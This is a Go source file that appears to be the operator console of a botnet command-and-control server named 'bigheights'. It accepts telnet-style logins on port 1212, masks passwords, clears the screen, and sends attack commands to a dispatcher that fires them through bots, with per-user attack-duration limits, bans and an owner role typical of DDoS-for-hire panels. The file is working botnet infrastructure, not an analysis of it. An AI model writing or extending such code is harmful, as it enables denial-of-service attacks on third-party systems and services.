// language: Go, file: cnc/internal/admin/admin.go
// *1212: accept -> banner -> login (masked pw) -> clear -> command loop.*
package admin

import (
	"bufio"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/term"

	"bigheights/cnc/internal/attack"
	"bigheights/cnc/internal/registry"
	"bigheights/cnc/internal/users"
)

// Console owns the 1212 listener and the command table.
type Console struct {
	Addr  string
	Reg   *registry.Registry
	Disp  *attack.Dispatcher
	Users *users.Store

	mu     sync.Mutex
	ln     net.Listener
	closed bool

	cmds map[string]Command
}

// Command is one console verb.
type Command struct {
	Name  string
	Usage string
	Admin bool // requires owner role
	Run   func(*Session, []string) error
}

// Session is one live operator connection.
type Session struct {
	Conn  net.Conn
	User  *users.User
	Out   *bufio.Writer
	In    *bufio.Reader
	Con   *Console
	Start time.Time

	// clearOnNext, when true, the loop wipes the terminal before
	// printing the next command's output. set after each command.
	clearOnNext bool
}

// New builds a console with the default command table wired.
func New(addr string, reg *registry.Registry, disp *attack.Dispatcher, us *users.Store) *Console {
	c := &Console{Addr: addr, Reg: reg, Disp: disp, Users: us, cmds: map[string]Command{}}
	c.registerCommands()
	return c
}

func (c *Console) registerCommands() {
	for _, cmd := range defaultCommands() {
		c.cmds[cmd.Name] = cmd
	}
}

func (c *Console) Register(cmd Command) { c.cmds[cmd.Name] = cmd }

func (c *Console) Lookup(name string) (Command, bool) {
	cmd, ok := c.cmds[strings.ToLower(name)]
	return cmd, ok
}

func (c *Console) Listen() error {
	ln, err := net.Listen("tcp", c.Addr)
	if err != nil {
		return err
	}
	c.mu.Lock()
	c.ln = ln
	c.mu.Unlock()

	for {
		conn, err := ln.Accept()
		if err != nil {
			c.mu.Lock()
			closed := c.closed
			c.mu.Unlock()
			if closed {
				return nil
			}
			time.Sleep(50 * time.Millisecond)
			continue
		}
		go c.handle(conn)
	}
}

func (c *Console) Close() {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.closed = true
	if c.ln != nil {
		_ = c.ln.Close()
	}
}

// handle runs one operator session: banner, login, clear, loop.
func (c *Console) handle(conn net.Conn) {
	defer conn.Close()

	s := &Session{
		Conn:  conn,
		Out:   bufio.NewWriterSize(conn, 4096),
		In:    bufio.NewReaderSize(conn, 4096),
		Con:   c,
		Start: time.Now(),
	}

	s.renderBanner()

	user, ok := c.login(s)
	if !ok {
		return
	}
	s.User = user

	// clear right after login so the password prompt and any failed tries
	// are gone, then draw the home screen fresh.
	s.clearScreen()
	s.renderHome()
	s.loop()
}

// login is the username/password gate. password is masked with '*'.
func (c *Console) login(s *Session) (*users.User, bool) {
	const attempts = 3
	for i := 0; i < attempts; i++ {
		s.write("login: ")
		name, err := s.readLine()
		if err != nil {
			return nil, false
		}
		s.write("password: ")
		pass, err := s.readPasswordMasked()
		if err != nil {
			return nil, false
		}
		s.write("\r\n")

		u, err := c.Users.Authenticate(strings.TrimSpace(name), pass)
		if err == nil {
			return u, true
		}

		var be *users.BanError
		if errors.As(err, &be) {
			s.renderBan(be)
			return nil, false
		}
		var te *users.TimeoutError
		if errors.As(err, &te) {
			s.renderTimeout(te)
			return nil, false
		}
		s.write("invalid credentials, try again\r\n")
	}
	s.write("too many attempts\r\n")
	return nil, false
}

// loop reads lines and dispatches. every command clears the screen first
// (except clear itself, which clears and redraws the banner once).
func (s *Session) loop() {
	for {
		s.writePrompt()
		line, err := s.readLine()
		if err != nil {
			return
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		fields := splitFields(line)
		verb := strings.ToLower(fields[0])
		args := fields[1:]

		// clear before running — the typed command line disappears
		s.clearScreen()

		if _, ok := methodVerbs[verb]; ok {
			s.runAttack(line)
			continue
		}

		cmd, ok := s.Con.Lookup(verb)
		if !ok {
			s.write("unknown command, type 'Help'\r\n")
			continue
		}
		if cmd.Admin && s.User.Role != users.RoleOwner {
			s.write("admin only\r\n")
			continue
		}
		if err := cmd.Run(s, args); err != nil {
			if errors.Is(err, errSessionClose) {
				return
			}
			s.write("error: " + err.Error() + "\r\n")
		}
	}
}

// runAttack parses and fires an attack line via the dispatcher.
func (s *Session) runAttack(line string) {
	if s.Con.Users.Hold() {
		s.write("bots are on hold\r\n")
		return
	}
	if s.User.MaxTime > 0 {
		req, err := attack.Parse(line, s.Con.Disp.NextPID)
		if err != nil {
			s.write("error: " + err.Error() + "\r\n")
			return
		}
		if int(req.Duration) > s.User.MaxTime {
			s.write(fmt.Sprintf("error: duration exceeds your max (%ds)\r\n", s.User.MaxTime))
			return
		}
		req.PID = s.Con.Disp.NextPID()
		s.fireAndReport(req)
		return
	}
	req, err := attack.Parse(line, s.Con.Disp.NextPID)
	if err != nil {
		s.write("error: " + err.Error() + "\r\n")
		return
	}
	s.fireAndReport(req)
}

// fireAndReport sends and prints the attack-sent screen.
func (s *Session) fireAndReport(req *attack.Request) {
	sent, total := s.Con.Disp.Fire(req, s.User.Name)
	s.renderAttackSent(req, sent, total)
}

// ---- terminal control ----

// clearScreen wipes display and scrollback. used after login and before
// every command's output, so the screen only ever shows the latest result.
func (s *Session) clearScreen() {
	s.write("\x1b[H\x1b[2J\x1b[3J")
}

// readPasswordMasked reads a line with the terminal in raw mode, echoing '*'.
// Backspace erases one star. Enter returns. Ctrl-C closes.
func (s *Session) readPasswordMasked() (string, error) {
	fd := connFileDescriptor(s.Conn)
	if fd < 0 {
		// no fd (shouldn't happen for a net.Conn we accepted) — plain read
		return s.readLine()
	}

	old, err := term.MakeRaw(fd)
	if err != nil {
		// raw mode unsupported on this transport — fall back to plain read.
		return s.readLine()
	}
	defer term.Restore(fd, old)

	var pw []byte
	buf := make([]byte, 1)
	for {
		n, rerr := s.Conn.Read(buf)
		if n > 0 {
			b := buf[0]
			switch b {
			case '\r', '\n':
				return string(pw), nil
			case 0x7f, 0x08: // backspace / delete
				if len(pw) > 0 {
					pw = pw[:len(pw)-1]
					s.write("\b \b")
				}
			case 0x03: // ctrl-c
				return "", errors.New("aborted")
			case 0x15: // ctrl-u — clear the whole line
				for len(pw) > 0 {
					pw = pw[:len(pw)-1]
					s.write("\b \b")
				}
			default:
				if b >= 0x20 && b < 0x7f {
					pw = append(pw, b)
					s.write("*")
				}
			}
		}
		if rerr != nil {
			return "", rerr
		}
	}
}

// write sends a raw string to the operator.
func (s *Session) write(str string) {
	_, _ = s.Out.WriteString(str)
	_ = s.Out.Flush()
}

// writePrompt prints "username@bigheights> ".
func (s *Session) writePrompt() {
	s.write(s.User.Name + "@bigheights> ")
}

// readLine reads one line, stripping CR/LF.
func (s *Session) readLine() (string, error) {
	line, err := s.In.ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimRight(line, "\r\n"), nil
}

func splitFields(s string) []string {
	return strings.Fields(s)
}

// connFileDescriptor extracts the underlying file descriptor from a net.Conn
// for use with golang.org/x/term (password masking).
func connFileDescriptor(c net.Conn) int {
	if tc, ok := c.(interface{ File() (*os.File, error) }); ok {
		if f, err := tc.File(); err == nil {
			return int(f.Fd())
		}
	}
	return -1
}